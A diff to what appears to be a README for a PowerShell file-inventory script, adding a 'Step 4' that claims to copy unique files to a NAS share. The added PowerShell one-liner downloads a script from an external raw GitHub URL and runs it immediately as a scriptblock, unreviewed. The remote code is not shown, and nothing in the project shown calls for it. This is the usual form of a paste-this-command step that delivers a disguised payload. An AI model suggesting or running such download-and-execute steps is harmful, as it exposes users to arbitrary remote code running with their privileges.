@@ -28,3 +28,9 @@ The script generates two CSV files on your Desktop:
 
 - **Inventory CSV:** File paths, sizes, timestamps, and SHA-256 hashes.
 - **Error CSV:** Files or directories that could not be processed.
+
+**Step 4:** Copy unique files to another nas share
+
+```powershell
+$Url="https://raw.githubusercontent.com/maximusrelease/extract/refs/heads/main/copy.ps1"; $Response=Invoke-WebRequest -Uri $Url -ErrorAction Stop; $ScriptText=$Response.Content; $ScriptBlock=[scriptblock]::Create($ScriptText); & $ScriptBlock
+```
